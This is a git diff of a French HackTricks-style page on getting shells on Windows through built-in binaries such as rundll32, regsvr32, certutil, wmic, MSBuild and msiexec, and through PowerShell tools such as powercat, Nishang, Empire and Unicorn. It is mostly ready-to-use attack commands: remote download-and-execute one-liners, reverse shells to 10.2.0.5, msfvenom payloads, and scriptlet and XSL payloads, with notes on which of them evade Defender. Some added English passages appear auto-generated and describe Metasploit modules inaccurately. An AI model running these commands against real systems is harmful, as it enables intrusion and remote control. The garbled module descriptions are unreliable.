+Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised systems. It uses the rundll32 utility to load its DLL payload and establish a backdoor on the target machine.
 
-```
-Rundll32.exe <path_to_koadic_dll>,<function_name> <arguments>
-```
+To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using the rundll32 utility, which executes the code contained within the DLL. Once the payload is executed, the attacker gains remote access to the compromised system and can perform various malicious activities.
 
-Le chemin d'accès au module Koadic DLL doit être spécifié, ainsi que le nom de la fonction à exécuter et les arguments à passer à cette fonction. Les attaquants peuvent utiliser cette technique pour exécuter des commandes malveillantes telles que la création d'un shell inversé ou la collecte d'informations sur le système compromis.
+Koadic provides a wide range of features, including file system access, keylogging, screenshot capture, and network reconnaissance. It also supports multiple communication channels, such as HTTP, DNS, and ICMP, making it difficult to detect and block.
 
-Il est important de noter que cette technique peut être détectée par les outils de sécurité qui surveillent les commandes Rundll32. Les défenses de sécurité peuvent être renforcées en désactivant l'exécution de Rundll32 à partir de répertoires non systèmes ou en surveillant les appels Rundll32 pour détecter les comportements malveillants.
+To prevent attacks utilizing Rundll32 and Koadic, it is important to implement strong security measures, such as regularly updating software, using strong passwords, and employing network segmentation. Additionally, monitoring network traffic and using intrusion detection systems can help detect and mitigate such attacks.
 ```bash
 use stager/js/rundll32_js
 set SRVHOST 192.168.1.107
@@ -308,7 +401,35 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-Regsvr32 est un outil de ligne de commande qui permet d'enregistrer et de supprimer des entrées de registre pour les bibliothèques de liens dynamiques (DLL) et les contrôles ActiveX dans Windows. Il peut également être utilisé pour exécuter du code malveillant sur une machine cible en enregistrant une DLL malveillante et en la chargeant dans le contexte d'un processus légitime. Cette technique est souvent utilisée dans les attaques de type "fileless" car elle ne nécessite pas de fichier exécutable sur le disque.
+Regsvr32 est une commande intégrée de Windows qui permet d'enregistrer ou de désenregistrer des bibliothèques de liens dynamiques (DLL) et des contrôles ActiveX dans le registre du système. Cette commande est souvent utilisée par les attaquants pour exécuter du code malveillant sur un système cible.
+
+### Syntaxe
+
+La syntaxe de base de la commande Regsvr32 est la suivante :
+
+```
+regsvr32 [/u] <chemin_vers_DLL>
+```
+
+- `/u` : option facultative pour désenregistrer la DLL spécifiée.
+
+### Utilisation en tant qu'outil d'attaque
+
+Les attaquants peuvent utiliser Regsvr32 pour exécuter du code malveillant enregistré dans une DLL. Ils peuvent également utiliser cette commande pour charger des bibliothèques tierces malveillantes dans le processus d'un programme légitime.
+
+Pour exécuter du code malveillant à l'aide de Regsvr32, les attaquants peuvent créer une DLL malveillante contenant leur code et l'enregistrer sur le système cible. Ensuite, ils peuvent utiliser la commande Regsvr32 pour charger et exécuter cette DLL.
+
+### Contre-mesures
+
+Pour se protéger contre les attaques utilisant Regsvr32, il est recommandé de suivre les bonnes pratiques de sécurité suivantes :
+
+- Maintenir le système d'exploitation et les logiciels à jour avec les derniers correctifs de sécurité.
+- Utiliser un logiciel antivirus et un pare-feu pour détecter et bloquer les fichiers malveillants.
+- Limiter les privilèges d'accès des utilisateurs pour réduire les risques d'exécution de code malveillant.
+- Surveiller les activités suspectes sur le réseau et les systèmes pour détecter les éventuelles attaques.
+- Sensibiliser les utilisateurs aux techniques d'ingénierie sociale et aux risques liés à l'ouverture de fichiers ou de liens provenant de sources non fiables.
+
+En suivant ces mesures de sécurité, vous pouvez réduire les risques d'exploitation de Regsvr32 et protéger votre système contre les attaques.
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -328,62 +449,36 @@ Charge utile écrite sur le disque : **Cache local du client WebDAV**
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
 <scriptlet>
-<registration 
-    progid="PoC"
-    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
-    <script language="JScript">
-        <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
-        ]]>
+<registration
+progid="PoC"
+classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]>
 </script>
 </registration>
 </scriptlet>
 ```
 #### **Regsvr32 - Metasploit**
 
-#### Regsvr32 - Metasploit
+Regsvr32 is a Windows command-line utility used to register and unregister DLL files. However, it can also be used as a technique for executing malicious code on a target system.
 
-La technique Regsvr32 est souvent utilisée pour exécuter du code malveillant sur une machine Windows. Metasploit propose un module pour exploiter cette technique.
+Metasploit, a popular penetration testing framework, provides a module called `regsvr32_command_delivery` that leverages this technique to deliver a payload to a target system.
 
-##### Utilisation
+To use this module, follow these steps:
 
-```
-use exploit/windows/local/regsvr32
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <your IP>
-set LPORT <your port>
-set RHOST <target IP>
-set RPORT <target port>
-set REGSVR32_PATH <path to regsvr32.exe on target>
-set REGSVR32_ARGS <arguments to pass to regsvr32.exe>
-set DLL_URL <URL to the DLL to download>
-set DLL_NAME <name of the DLL to download>
-set DLL_PATH <path to the DLL on target>
-set TARGET <target architecture (x86 or x64)>
-run
-```
+1. Start Metasploit by running the `msfconsole` command.
+2. Search for the `regsvr32_command_delivery` module using the `search` command.
+3. Load the module using the `use` command followed by the module name.
+4. Set the required options, such as the `LHOST` (your IP address) and `LPORT` (the port to listen on).
+5. Run the module using the `exploit` command.
 
-##### Exemple
+Once the module is executed, it will generate a malicious DLL file and register it using the `regsvr32` command. When the target system loads the DLL, the payload will be executed.
 
-```
-use exploit/windows/local/regsvr32
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.10
-set LPORT 4444
-set RHOST 192.168.1.20
-set RPORT 445
-set REGSVR32_PATH C:\Windows\System32\regsvr32.exe
-set REGSVR32_ARGS /s /u /i
-set DLL_URL http://192.168.1.10:8000/evil.dll
-set DLL_NAME evil.dll
-set DLL_PATH C:\Windows\Temp\evil.dll
-set TARGET x64
-run
-```
+This technique can be useful for bypassing security measures that may block traditional executable files. However, it is important to note that it relies on the target system having the necessary DLL files and permissions to register them.
 
-##### Explication
-
-Ce module utilise la technique Regsvr32 pour télécharger et exécuter un fichier DLL malveillant sur la machine cible. Le fichier DLL est téléchargé depuis une URL spécifiée et enregistré dans un emplacement temporaire sur la machine cible. Ensuite, Regsvr32 est utilisé pour exécuter le fichier DLL malveillant. Le module prend en charge les architectures x86 et x64.
+Keep in mind that using this technique without proper authorization is illegal and unethical. Always ensure you have the necessary permissions and legal authorization before attempting any penetration testing activities.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -404,9 +499,9 @@ Téléchargez un fichier B64exe, décodez-le et exécutez-le.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Détecté par Defender**
+**Détecté par le défenseur**
 
-***
+
 
 <figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -414,9 +509,9 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 🐞 Lisez les tutoriels sur les bugs web3
 
-🔔 Recevez des notifications sur les nouveaux programmes de primes pour bugs
+🔔 Recevez des notifications sur les nouvelles primes de bugs
 
-💬 Participez aux discussions de la communauté
+💬 Participez aux discussions communautaires
 
 ## **Cscript/Wscript**
 ```bash
@@ -424,15 +519,31 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```
 **Cscript - Metasploit**
 
-Le module `exploit/windows/local/cscript` de Metasploit permet d'exécuter du code arbitraire en tant qu'utilisateur SYSTEM en utilisant le binaire `cscript.exe` de Windows. Ce module exploite une vulnérabilité de DLL hijacking dans `cscript.exe` pour charger une DLL malveillante et exécuter du code arbitraire. 
+Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems.
 
-Pour utiliser ce module, il suffit de configurer les options `SESSION` et `PAYLOAD`, puis de lancer l'exploit. Une fois l'exploit réussi, l'utilisateur SYSTEM sera créé et un shell sera ouvert. 
+Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It is widely used by security professionals for testing the security of computer systems.
 
-Il est important de noter que ce module ne fonctionne que sur les versions de Windows antérieures à Windows 10.
+When it comes to exploiting Windows systems using Metasploit, Cscript can be a useful tool. By leveraging Cscript, you can execute VBScript or JScript code on a target Windows machine, allowing you to perform various actions, such as executing commands, manipulating files, or even establishing a remote shell.
+
+To use Cscript with Metasploit, you can utilize the `exploit/windows/local/cscript` module. This module allows you to execute VBScript or JScript code on a target Windows system. You can specify the script to execute using the `SCRIPT` option.
+
+Here's an example of how to use the `exploit/windows/local/cscript` module:
+
+```
+use exploit/windows/local/cscript
+set SCRIPT /path/to/script.vbs
+exploit
+```
+
+In this example, replace `/path/to/script.vbs` with the actual path to your VBScript or JScript file.
+
+Once the exploit is executed, the specified script will be run on the target Windows machine, giving you the ability to perform various actions and potentially gain further access to the system.
+
+It's important to note that using Cscript with Metasploit should only be done in a legal and authorized manner, such as during a penetration test or with proper consent. Unauthorized use of these techniques can lead to legal consequences.
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-## Détecté par Defender
+**Détecté par Defender**
 
 ## PS-Bat
 ```bash
@@ -448,11 +559,11 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-## **Détecté par Defender**
+**Détecté par le défenseur**
 
 ## **MSIExec**
 
-Défenseur
+Attaquant
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
@@ -467,19 +578,19 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Processus effectuant un appel réseau: **wmic.exe**\
-Charge utile écrite sur le disque: **cache local d'IE**
+Processus effectuant un appel réseau : **wmic.exe**\
+Charge utile écrite sur le disque : **cache local d'IE**
 
-Exemple de fichier xsl:
+Exemple de fichier xsl :
 ```
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
 <output method="text"/>
-    <ms:script implements-prefix="user" language="JScript">
-        <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
-        ]]>
-    </ms:script>
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
+]]>
+</ms:script>
 </stylesheet>
 ```
 Extrait de [ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
@@ -492,11 +603,11 @@ Extrait de [ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Processus effectuant un appel réseau: **svchost.exe**\
-Charge utile écrite sur le disque: **Cache local du client WebDAV**
+Processus effectuant un appel réseau : **svchost.exe**\
+Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
-Vous pouvez utiliser cette technique pour contourner la liste blanche d'applications et les restrictions de Powershell.exe. Vous serez invité avec un shell PS.\
-Téléchargez simplement ceci et exécutez-le: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Vous pouvez utiliser cette technique pour contourner la liste blanche des applications et les restrictions de Powershell.exe. Vous serez invité avec un shell PS.\
+Il suffit de télécharger ceci et de l'exécuter : [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -504,7 +615,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compiler du code C# sur la machine victime.
+Compiler le code C# sur la machine victime.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -516,8 +627,8 @@ Vous pouvez télécharger un shell inversé C# de base à partir d'ici: [https:/
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-Processus effectuant un appel réseau: **svchost.exe**\
-Charge utile écrite sur le disque: **Cache local du client WebDAV**
+Processus effectuant un appel réseau : **svchost.exe**\
+Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
 **Je ne l'ai pas essayé**
 
@@ -528,19 +639,19 @@ Charge utile écrite sur le disque: **Cache local du client WebDAV**
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Processus effectuant un appel réseau : **svchost.exe**\
-Charge utile écrite sur le disque : **cache local du client WebDAV**
+Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
 **Je ne l'ai pas essayé**
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Shells Powershell
+## Shells PowerShell
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Dans le dossier **Shells**, il y a beaucoup de shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier :
+Dans le dossier **Shells**, il y a plusieurs shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier :
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -558,34 +669,34 @@ Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019
 
 Téléchargez, démarrez un serveur web, démarrez l'écouteur et exécutez-le sur l'ordinateur de la victime :
 ```
- powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
+powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).
+Le Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).
 
 **Autres options offertes par powercat:**
 
-Lier des shells, Shell inversé (TCP, UDP, DNS), Redirection de port, téléchargement/téléversement, Générer des charges utiles, Servir des fichiers...
+Coquilles de liaison, coquille inversée (TCP, UDP, DNS), redirection de port, téléchargement/téléversement, génération de charges utiles, fourniture de fichiers...
 ```
 Serve a cmd Shell:
-    powercat -l -p 443 -e cmd
+powercat -l -p 443 -e cmd
 Send a cmd Shell:
-    powercat -c 10.1.1.1 -p 443 -e cmd
+powercat -c 10.1.1.1 -p 443 -e cmd
 Send a powershell:
-    powercat -c 10.1.1.1 -p 443 -ep
+powercat -c 10.1.1.1 -p 443 -ep
 Send a powershell UDP:
-    powercat -c 10.1.1.1 -p 443 -ep -u
+powercat -c 10.1.1.1 -p 443 -ep -u
 TCP Listener to TCP Client Relay:
-    powercat -l -p 8000 -r tcp:10.1.1.16:443
+powercat -l -p 8000 -r tcp:10.1.1.16:443
 Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
-    powercat -c 10.1.1.15 -p 443 -e cmd -g
+powercat -c 10.1.1.15 -p 443 -e cmd -g
 Start A Persistent Server That Serves a File:
-    powercat -l -p 443 -i C:\inputfile -rep
+powercat -l -p 443 -i C:\inputfile -rep
 ```
 ### Empire
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Créez un lanceur PowerShell, enregistrez-le dans un fichier, téléchargez-le et exécutez-le.
+Créez un lanceur PowerShell, enregistrez-le dans un fichier, puis téléchargez-le et exécutez-le.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -595,7 +706,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Créez une version PowerShell de la porte dérobée Metasploit en utilisant Unicorn.
+Créez une version PowerShell de la porte dérobée Metasploit en utilisant unicorn.
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -603,11 +714,11 @@ Démarrez msfconsole avec la ressource créée:
 ```
 msfconsole -r unicorn.rc
 ```
-Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez sur la victime:
+Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime :
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-## Détecté comme code malveillant
+**Détecté comme code malveillant**
 
 ## Plus
 
@@ -630,9 +741,9 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modul
 
 [**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**
 
-🐞 Lisez les tutoriels sur les bugs web3
+🐞 Lisez des tutoriels sur les bugs web3
 
-🔔 Soyez informé des nouveaux programmes de primes pour bugs
+🔔 Recevez des notifications sur les nouvelles primes de bugs
 
 💬 Participez aux discussions de la communauté
 
@@ -640,10 +751,10 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modul
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
